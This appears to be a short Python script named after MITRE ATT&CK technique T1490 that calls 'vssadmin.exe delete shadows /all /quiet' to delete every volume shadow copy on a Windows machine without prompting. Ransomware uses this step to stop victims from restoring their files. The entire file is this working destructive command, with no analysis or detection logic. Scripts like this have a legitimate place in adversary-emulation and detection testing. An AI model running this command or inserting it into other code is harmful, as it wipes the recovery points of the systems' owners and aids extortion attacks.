#!/usr/bin/env python3
## Author: lehag
## Code: T1490-DeleteVolumeShadows.py
"""
	Description:
		It deletes all volume shadow copies on a system.
"""
import subprocess
import sys

if __name__ == "__main__":
	print("[+] Deleting volume shadow copies on the system.");

	## Deletes all volume shadow copies
	result = subprocess.run(["vssadmin.exe", "delete", "shadows", "/all", "/quiet"]);
